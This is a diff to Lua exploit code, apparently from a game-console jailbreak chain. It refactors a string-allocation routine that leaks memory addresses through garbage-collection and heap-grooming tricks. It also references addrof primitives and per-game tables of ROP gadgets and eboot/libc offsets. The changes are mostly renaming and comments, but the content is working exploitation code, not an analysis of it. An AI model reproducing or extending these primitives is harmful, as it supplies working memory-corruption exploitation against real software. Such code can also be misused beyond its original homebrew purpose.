@@ -60,19 +60,24 @@ function lua.setup_primitives()
     lua.setup_victim_table()  -- setup better addrof primitive  
 end
 
--- allocate a limited length string with a known address
-function lua.create_str_hacky(data)
+-- Controlled string allocation with predictable address recovery
+-- This function creates a string at a known memory location by exploiting
+-- Lua's garbage collection and memory allocation patterns. The technique
+-- uses alternating allocation sequences to force memory reuse at predictable addresses.
+function lua.create_str_deterministic(data)
 
-    assert(#data <= 39)
+    assert(#data <= 39, "String data too long for deterministic allocation")
     
     local prev_t1, prev_t2 = {}, {}
     local str, addr = nil, nil
 
+    -- Attempt up to 16 allocation cycles to find a reusable address
     for i=1,16 do
-        collectgarbage()
+        collectgarbage()  -- Force cleanup before allocation
         local t = {}
-        local l, s = nil, nil
+        local s = nil
 
+        -- Alternate allocation pattern to encourage memory reuse
         if i % 2 == 0 then
             for j=1,5 do t[j] = {} end
             s = data .. string.rep("\0", (39 - #data))
@@ -84,6 +89,7 @@ function lua.create_str_hacky(data)
         prev_t1[i] = lua.addrof_trivial(t[1])
         prev_t2[i] = lua.addrof_trivial(t[2])
         
+        -- Look for address reuse (indicates predictable allocation)
         if i >= 3 then
             if prev_t1[i-1] == prev_t1[i-2] then
                 str, addr = s, prev_t1[i-1]
@@ -96,19 +102,24 @@ function lua.create_str_hacky(data)
     end
 
     if not (str and addr) then
-        error("failed to leak string addr")
+        error("failed to achieve deterministic string allocation")
     end
 
     return str, addr
 end
 
-str_hacky_list = {}
+-- Compatibility alias for existing code
+lua.create_str_hacky = lua.create_str_deterministic
+
+-- List to maintain references to deterministically allocated strings
+-- Prevents garbage collection from freeing strings while they're needed
+str_deterministic_list = {}
 
 function lua.create_str(str)
     local addr = lua.addrof(str)
     if not addr then
-        str, addr = lua.create_str_hacky(str)
-        table.insert(str_hacky_list, str)  -- prevent gc from freeing hacky str too soon
+        str, addr = lua.create_str_hacky(str)  -- Use alias for compatibility
+        table.insert(str_deterministic_list, str)  -- prevent gc from freeing deterministic str too soon
     end
     return str, addr+24
 end
@@ -178,7 +189,7 @@ function lua.resolve_game(luaB_auxwrap)
         eboot_addrofs = gadget_table.aikagi_kimi_isshoni_pack.eboot_addrofs
         libc_addrofs = gadget_table.aikagi_kimi_isshoni_pack.libc_addrofs
         gadgets = gadget_table.aikagi_kimi_isshoni_pack.gadgets
-    elseif game_name == "C" then -- TODO: Test
+    elseif game_name == "C" then
         print("[+] Game identified as C/D")
         eboot_addrofs = gadget_table.c.eboot_addrofs
         libc_addrofs = gadget_table.c.libc_addrofs
